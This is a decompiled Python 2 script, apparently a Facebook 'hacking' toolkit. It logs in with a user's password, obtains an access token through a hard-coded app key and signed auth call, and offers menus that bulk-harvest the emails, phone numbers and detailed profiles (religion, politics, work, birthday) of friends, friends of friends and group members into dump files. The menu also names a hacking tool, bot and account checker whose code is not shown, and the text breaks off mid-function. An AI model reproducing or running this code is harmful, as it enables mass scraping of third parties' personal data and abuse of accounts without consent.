# Decompile At :  Mon Mar  9 13:45:09 2020
# from python 2.7.17 version
merah  = '\x1b[1;91m'
lime   = '\x1b[1;92m'
kuning = '\x1b[1;93m'
biru   = '\x1b[1;94m'
ungu   = '\x1b[1;95m'
blue   = '\x1b[1;96m'
putih  = '\x1b[1;97m'
tutup  = '\x1b[0m'
try:
    import os, sys, time, random, hashlib, re, threading, json, urllib, requests, mechanize, urllib, cookielib, marshal, zlib, base64
    from multiprocessing.pool import ThreadPool
    from bs4 import BeautifulSoup as sup
except Exception as modul:
    exit(tutup + '[' + merah + '!' + tutup + '] Module Error : ' + str(modul))

reload(sys)
sys.setdefaultencoding('utf8')
sex = mechanize.Browser()
apa = requests.Session()
sex.set_handle_robots(False)
sex.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
sex.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
at = 'mr.Bacot'
idfriend = []
idfromfriend = []
idmem = []
emteman = []
emfromfriend = []
emmem = []
nofriend = []
nofromfriend = []
nomem = []
berhasil = []
checkpoint = []
gagal = []
back = 0
threads = []
auto_total = []
auto_ok = []
auto_cp = []
auto_run = []

def login():
    try:
        token = open('logs.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print merah + ' ||  || ' + merah + '  \xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97' + tutup + '\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   ' + merah + '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97' + tutup
        print merah + ' \\\\' + putih + '()' + merah + '//' + merah + '    \xe2\x95\x91\xe2\x95\x91' + tutup + '\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80' + merah + '\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97' + tutup
        print merah + '//' + putih + '(__)' + merah + '\\\\' + merah + '  \xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d' + tutup + '\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   ' + merah + '\xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d' + kuning + 'v1.8' + tutup
        print merah + '||    || ' + tutup + u' \x1b[7m Recode: [ MR.J8K3R ]\x1b[0m'
        print tutup + '\n[' + blue + '\xe2\x97\x8f' + tutup + '] LOGIN ACCOUNT FACEBOOK ' + tutup + '[' + blue + '\xe2\x97\x8f' + tutup + ']' + tutup
        usr = raw_input(tutup + '[' + blue + '+' + tutup + '] Username : ' + lime)
        pwd = raw_input(tutup + '[' + blue + '+' + tutup + '] Password : ' + lime)
        try:
            sex.open('https://m.facebook.com')
        except mechanize.URLError:
            exit(tutup + '[' + merah + '!' + tutup + '] Koneksi Error')

        sex._factory.is_html = True
        sex.select_form(nr=0)
        sex.form['email'] = usr
        sex.form['pass'] = pwd
        sex.submit()
        ambil = sex.geturl()
        if 'save-device' in ambil:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + usr + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': usr, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                a = requests.get(url, params=data)
                b = json.loads(a.text)
                my = open('logs.txt', 'w')
                my.write(b['access_token'])
                my.close()
                print tutup + '[' + lime + '+' + tutup + '] Login berhasil'
                os.system('xdg-open https://wa.me/6282322405139')
                menu()
            except requests.exceptions.ConnectionError:
                 exit(tutup + '[' + merah + '!' + tutup + '] Koneksi Error')

        elif 'checkpoint' in ambil:
            os.system('rm -rf logs.txt')
            exit(tutup + '[' + kuning + '!' + tutup + '] Checkpoint')
        else:
            os.system('rm -rf logs.txt')
            exit(tutup + '[' + merah + '!' + tutup + '] Username/Password Incorrect')



def menu():
    try:
        token = open('logs.txt').read()
        cek = requests.get('https://graph.facebook.com/me?access_token=' + token)
        a = json.loads(cek.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        print tutup + '[' + kuning + '!' + tutup + '] Checkpoint'
        os.system('rm -rf logs.txt')
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    except requests.exceptions.ConnectionError:
        exit(merah + '[!] No Connection')    
    os.system('clear')
    print merah + ' ||  || ' + merah + '  \xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97' + tutup + '\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   ' + merah + '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97' + tutup
    print merah + ' \\\\' + putih + '()' + merah + '//' + merah + '    \xe2\x95\x91\xe2\x95\x91' + tutup + '\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80' + merah + '\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97' + tutup
    print merah + '//' + putih + '(__)' + merah + '\\\\' + merah + '  \xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d' + tutup + '\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   ' + merah + '\xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d' + kuning + 'v1.8' + tutup
    print merah + '||    || ' + tutup + u' \x1b[7m Recode: [ MR.J8K3R ]\x1b[0m'
    print
    print tutup + '[' + blue + '\xe2\x97\x8f' + tutup + '] User : ' + lime + nama + tutup
    print
    print tutup + '(' + lime + '01' + tutup + ') Account information'
    print tutup + '(' + lime + '02' + tutup + ') Get ID/EMAIL/PHONE'
    print tutup + '(' + lime + '03' + tutup + ') Facebook hacking tool'
    print tutup + '(' + lime + '04' + tutup + ') BoT'
    print tutup + '(' + lime + '05' + tutup + ') Create status'
    print tutup + '(' + lime + '06' + tutup + ') Profile guard'
    print tutup + '(' + lime + '07' + tutup + ') Group list'
    print tutup + '(' + lime + '08' + tutup + ') Auto account checker L/C/D'
    print tutup + '(' + lime + '09' + tutup + ') Account check bind apps'
    print tutup + '(' + lime + '10' + tutup + ') Remove access token'
    print tutup + '(' + lime + '11' + tutup + ') Info Tools'
    print tutup + '(' + merah + '00' + tutup + ') Exit'
    print
    mana = raw_input(tutup + '[' + lime + 'Joker' + tutup + ']> ' + lime)
    if mana == '':
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    elif mana in ('1', '01'):
        informasi()
    elif mana in ('2', '02'):
        dump()
    elif mana in ('3', '03'):
        hack()
    elif mana in ('4', '04'):
        bot()
    elif mana in ('5', '05'):
        status()
    elif mana in ('6', '06'):
        guard()
    elif mana in ('7', '07'):
        lgrup()
    elif mana in ('8', '08'):
        acek()
    elif mana in ('9', '09'):
        acekpp()
    elif mana in ('10', ):
        os.remove('logs.txt')
        exit(tutup + '[' + lime + '!' + tutup + '] Berhasil menghapus access token')
    elif mana in ('11', ):
        infotools()
    elif mana in ('0', '00'):
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    else:
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)

def informasi():
    print
    id = raw_input(tutup + '[' + lime + '+' + tutup + '] Search Name or ID : ' + lime)
    if id == '':
        print tutup + '[' + merah + '!' + tutup + '] Masukkan' + tutup
        raw_input(tutup + '\nBack ...')
        menu()
    print tutup + '[' + lime + '*' + tutup + '] Searching ...'
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
    q = json.loads(r.text)
    for i in q['data']:
        if id in i['name'] or id in i['id']:
            a = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
            b = json.loads(a.text)
            print
            try:
                print tutup + '[' + lime + '+' + tutup + '] Name : ' + lime + b['name']
            except KeyError:
                pass
            else:
                try:
                    print tutup + '[' + lime + '+' + tutup + '] First name : ' + lime + b['first_name']
                except KeyError:
                    pass
                else:
                    try:
                        print tutup + '[' + lime + '+' + tutup + '] Middle name : ' + lime + b['middle_name']
                    except KeyError:
                        pass
                    else:
                        try:
                            print tutup + '[' + lime + '+' + tutup + '] Last name : ' + lime + b['last_name']
                        except KeyError:
                            pass
                        else:
                            try:
                                print tutup + '[' + lime + '+' + tutup + '] ID : ' + lime + b['id']
                            except KeyError:
                                pass
                            else:
                                try:
                                    print tutup + '[' + lime + '+' + tutup + '] Username : ' + lime + b['username']
                                except KeyError:
                                    pass
                                else:
                                    try:
                                        print tutup + '[' + lime + '+' + tutup + '] Email : ' + lime + b['email']
                                    except KeyError:
                                        pass
                                    else:
                                        try:
                                            print tutup + '[' + lime + '+' + tutup + '] Mobile phone : ' + lime + b['mobile_phone']
                                        except KeyError:
                                            pass
                                        else:
                                            try:
                                                print tutup + '[' + lime + '+' + tutup + '] Locale : ' + lime + b['locale'].split('_')[0]
                                            except KeyError:
                                                pass
                                            else:
                                                try:
                                                    print tutup + '[' + lime + '+' + tutup + '] Location : ' + lime + b['location']['name']
                                                except KeyError:
                                                    pass
                                                else:
                                                    try:
                                                        print tutup + '[' + lime + '+' + tutup + '] Hometown : ' + lime + b['hometown']['name']
                                                    except KeyError:
                                                        pass
                                                    else:
                                                        try:
                                                            print tutup + '[' + lime + '+' + tutup + '] Gender : ' + lime + b['gender']
                                                        except KeyError:
                                                            pass

                                                    try:
                                                        print tutup + '[' + lime + '+' + tutup + '] Religion : ' + lime + b['religion']
                                                    except KeyError:
                                                        pass

                                                try:
                                                    print tutup + '[' + lime + '+' + tutup + '] Political : ' + lime + b['political']
                                                except KeyError:
                                                    pass

                                            try:
                                                print tutup + '[' + lime + '+' + tutup + '] Work : '
                                                for i in b['work']:
                                                    try:
                                                        print tutup + '     ' + lime + '-' + tutup + ' Position : ' + lime + i['position']['name']
                                                    except KeyError:
                                                        pass
                                                    else:
                                                        try:
                                                            print tutup + '     ' + lime + '-' + tutup + ' Employer : ' + lime + i['employer']['name']
                                                        except KeyError:
                                                            pass
                                                        else:
                                                            try:
                                                                if i['start_date'] == '0000-00':
                                                                    print tutup + '     ' + lime + '-' + tutup + ' Start date : ' + lime + '---'
                                                                else:
                                                                    print tutup + '     ' + lime + '-' + tutup + ' Start date : ' + lime + i['start_date']
                                                            except KeyError:
                                                                pass

                                                            try:
                                                                if i['end_date'] == '0000-00':
                                                                    print tutup + '     ' + lime + '-' + tutup + ' End date : ' + lime + '---'
                                                                else:
                                                                    print tutup + '     ' + lime + '-' + tutup + ' End date : ' + lime + i['end_date']
                                                            except KeyError:
                                                                pass

                                                        try:
                                                            print tutup + '     ' + lime + '-' + tutup + ' Location : ' + lime + i['location']['name']
                                                        except KeyError:
                                                            pass

                                            except KeyError:
                                                pass

                                        try:
                                            print tutup + '[' + lime + '+' + tutup + '] Updated time : ' + lime + b['updated_time'][:10] + ' ' + b['updated_time'][11:19]
                                        except KeyError:
                                            pass

                                    try:
                                        print tutup + '[' + lime + '+' + tutup + '] Languages :'
                                        for i in b['languages']:
                                            try:
                                                print tutup + '     ' + lime + '-' + tutup + ' Languages : ' + lime + i['name']
                                            except KeyError:
                                                pass

                                    except KeyError:
                                        pass

                                try:
                                    print tutup + '[' + lime + '+' + tutup + '] Bio : ' + lime + b['bio']
                                except KeyError:
                                    pass

                            try:
                                print tutup + '[' + lime + '+' + tutup + '] Quotes : ' + lime + b['quotes']
                            except KeyError:
                                pass

                        try:
                            print tutup + '[' + lime + '+' + tutup + '] Birthday : ' + lime + b['birthday'].replace('/', '-')
                        except KeyError:
                            pass

                    try:
                        print tutup + '[' + lime + '+' + tutup + '] Link : ' + lime + b['link']
                    except KeyError:
                        pass

                try:
                    print tutup + '[' + lime + '+' + tutup + '] School :'
                    for i in b['education']:
                        try:
                            print tutup + '     ' + lime + '-' + tutup + ' School : ' + lime + i['name']
                        except KeyError:
                            pass

                except KeyError:
                    pass

            print tutup + '[' + lime + '+' + tutup + '] Done'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
    else:
        print tutup + '[' + merah + '!' + tutup + '] Not Found'
        raw_input(tutup + '\nEnter returns to the menu ...')
        menu()


def dump():
    print
    print tutup + '(' + lime + '01' + tutup + ') Get id friend'
    print tutup + '(' + lime + '02' + tutup + ') Get id friend from friend'
    print tutup + '(' + lime + '03' + tutup + ') Get id member group'
    print tutup + '(' + lime + '04' + tutup + ') Get email friend'
    print tutup + '(' + lime + '05' + tutup + ') Get email friend from friend'
    print tutup + '(' + lime + '06' + tutup + ') Get email member group'
    print tutup + '(' + lime + '07' + tutup + ') Get number phone friend'
    print tutup + '(' + lime + '08' + tutup + ') Get number phone from friend'
    print tutup + '(' + lime + '09' + tutup + ') Get number phone member group'
    print tutup + '(' + merah + '00' + tutup + ') Back'
    print
    mana_dump = raw_input(tutup + '[' + lime + 'Joker' + tutup + ']> ' + lime)
    if mana_dump == '':
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    elif mana_dump in ('1', '01'):
        id_teman()
    elif mana_dump in ('2', '02'):
        id_dariteman()
    elif mana_dump in ('3', '03'):
        id_member()
    elif mana_dump in ('4', '04'):
        em_teman()
    elif mana_dump in ('5', '05'):
        em_dariteman()
    elif mana_dump in ('6', '06'):
        em_member()
    elif mana_dump in ('7', '07'):
        no_teman()
    elif mana_dump in ('8', '08'):
        no_dariteman()
    elif mana_dump in ('9', '09'):
        no_member()
    elif mana_dump in ('0', '00'):
        menu()
    else:
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)

def id_teman():
    print
    try:
        os.mkdir('dump')
    except OSError:
        pass

    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
    z = json.loads(r.text)
    print tutup + '[' + lime + '+' + tutup + '] Fetching id all friend ...' + tutup
    save = open('dump/id_teman.txt', 'w')
    for y in z['data']:
        idfriend.append(y['id'])
        save.write(y['id'] + '\n')
        print tutup + '\r[' + lime + '+' + tutup + '] Total : ' + lime + str(len(idfriend)),
        save.flush()
        time.sleep(0.0001)

    save.close()
    print tutup + '\n[' + lime + '+' + tutup + '] Successfully get id friend'
    done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
    print tutup + '[' + lime + '+' + tutup + '] Create file ...'
    time.sleep(2)
    os.rename('dump/id_teman.txt', 'dump/' + done)
    print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
    print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def id_dariteman():
    print
    try:
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idt = raw_input(tutup + '[' + lime + '+' + tutup + '] Input ID Friend : ' + lime)
        try:
            a = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            f = json.loads(a.text)
            print tutup + '[' + blue + '\xe2\x9c\x93' + tutup + '] Get ID From : ' + lime + f['name']
        except KeyError:
            print tutup + '[' + merah + '!' + tutup + '] Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
    r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + token)
    z = json.loads(r.text)
    print tutup + '[' + lime + '+' + tutup + '] Fetching id all friend from ' + lime + f['name'] + tutup
    save = open('dump/id_temandariteman.txt', 'w')
    for y in z['friends']['data']:
        idfromfriend.append(y['id'])
        save.write(y['id'] + '\n')
        print tutup + '\r[' + lime + '+' + tutup + '] Total : ' + lime + str(len(idfromfriend)),
        save.flush()
        time.sleep(0.0001)

    save.close()
    print tutup + '\n[' + lime + '+' + tutup + '] Successfully get id friend from ' + lime + f['name'] + tutup
    done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
    print tutup + '[' + lime + '+' + tutup + '] Create file ...'
    time.sleep(2)
    os.rename('dump/id_temandariteman.txt', 'dump/' + done)
    print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
    print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def id_member():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idg = raw_input(tutup + '[' + lime + '+' + tutup + '] Input ID Group : ' + lime)
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + token)
            s = json.loads(r.text)
            print tutup + '[' + blue + '\xe2\x9c\x93' + tutup + '] Name Group : ' + lime + s['name'] + tutup
        except KeyError:
            print tutup + '[' + merah + '!' + tutup + '] Group Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()

        try:
            print tutup + '[' + lime + '+' + tutup + '] Fetching id from member group ...' + tutup
            save = open('dump/id_member.txt', 'w')

            def lanjut(urlz):
                u = requests.get(urlz)
                hasil = json.loads(u.text)
                halaman = hasil['paging']
                for z in hasil['data']:
                    idmem.append(z['id'])
                    save.write(z['id'] + '\n')
                    print tutup + '\r[' + lime + '+' + tutup + '] Total : ' + str(len(idmem)),
                    sys.stdout.flush
                    time.sleep(0.0001)

                if halaman.get('next') is not None:
                    lanjut(halaman.get('next'))
                return


            def ambil():
                r = requests.get('https://graph.facebook.com/' + idg + '/members?fileds=id&limit=5000&summary=true&access_token=' + token)
                hasil = json.loads(r.text)
                halaman = hasil['paging']
                for z in hasil['data']:
                    idmem.append(z['id'])
                    save.write(z['id'] + '\n')

                if halaman.get('next') is not None:
                    lanjut(halaman.get('next'))
                return


            ambil()
            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get id from member group'
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/id_member.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except (KeyboardInterrupt, IOError, EOFError, KeyError):
            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/id_member.txt' + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except requests.exceptions.ConnectionError:
            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/id_member.txt' + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def em_teman():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        try:
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            a = json.loads(r.text)
            print tutup + '[' + lime + '+' + tutup + '] Fetching email all friend ...' + tutup
            save = open('dump/em_teman.txt', 'w')
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    emteman.append(z['email'])
                    save.write(z['email'] + '\n')
                    print tutup + '\r[ ' + lime + str(len(emteman)) + tutup + ' ] ' + z['email'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get email friend'
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/em_teman.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get email friend'
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/em_teman.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def em_dariteman():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idt = raw_input(tutup + '[' + lime + '+' + tutup + '] Input ID Friend : ' + lime)
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            p = json.loads(r.text)
            print tutup + '[' + blue + '\xe2\x9c\x93' + tutup + '] Get Email From : ' + lime + p['name']
        except KeyError:
            print tutup + '[' + merah + '!' + tutup + '] Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()

        try:
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
            a = json.loads(r.text)
            print tutup + '[' + lime + '+' + tutup + '] Fetching email all friend from ' + lime + p['name'] + tutup
            save = open('dump/em_dariteman.txt', 'w')
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    emfromfriend.append(z['email'])
                    save.write(z['email'] + '\n')
                    print tutup + '\r[ ' + lime + str(len(emfromfriend)) + tutup + ' ] ' + z['email'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get email friend from ' + lime + p['name'] + tutup
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/em_dariteman.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get email friend from ' + lime + p['name'] + tutup
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/em_dariteman.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def em_member():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idg = raw_input(tutup + '[' + lime + '+' + tutup + '] Input ID Group : ' + lime)
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + token)
            s = json.loads(r.text)
            print tutup + '[' + blue + '\xe2\x9c\x93' + tutup + '] Name Group : ' + lime + s['name'] + tutup
        except KeyError:
            print tutup + '[' + merah + '!' + tutup + '] Group Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()

        try:
            print tutup + '[' + lime + '+' + tutup + '] Fetching email from member group ...' + tutup
            save = open('dump/em_member.txt', 'w')
            p = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + token)
            i = json.loads(p.text)
            for a in i['data']:
                x = requests.get('https://graph.facebook.com/' + a['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    emmem.append(z['email'])
                    save.write(z['email'] + '\n')
                    print tutup + '\r[ ' + lime + str(len(emmem)) + tutup + ' ] ' + z['email'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get email from member group'
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/em_member.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get email from member group'
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/em_member.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def no_teman():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        try:
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            s = json.loads(r.text)
            print tutup + '[' + lime + '+' + tutup + '] Fetching number phone all friend ...' + tutup
            save = open('dump/no_teman.txt', 'w')
            for i in s['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    nofriend.append(z['mobile_phone'])
                    save.write(z['mobile_phone'] + '\n')
                    print tutup + '\r[ ' + lime + str(len(nofriend)) + tutup + ' ] ' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get number phone friend'
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/no_teman.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get number phone friend'
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/no_teman.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def no_dariteman():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idt = raw_input(tutup + '[' + lime + '+' + tutup + '] Input ID Friend : ' + lime)
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            p = json.loads(r.text)
            print tutup + '[' + blue + '\xe2\x9c\x93' + tutup + '] Get Number From : ' + lime + p['name']
        except KeyError:
            print tutup + '[' + merah + '!' + tutup + '] Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()

        try:
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
            a = json.loads(r.text)
            print tutup + '[' + lime + '+' + tutup + '] Fetching number phone all friend from ' + lime + p['name'] + tutup
            save = open('dump/no_dariteman.txt', 'w')
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    nofromfriend.append(z['mobile_phone'])
                    save.write(z['mobile_phone'] + '\n')
                    print tutup + '\r[ ' + lime + str(len(nofromfriend)) + tutup + ' ] ' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get number phone friend from ' + lime + p['name'] + tutup
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/no_dariteman.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
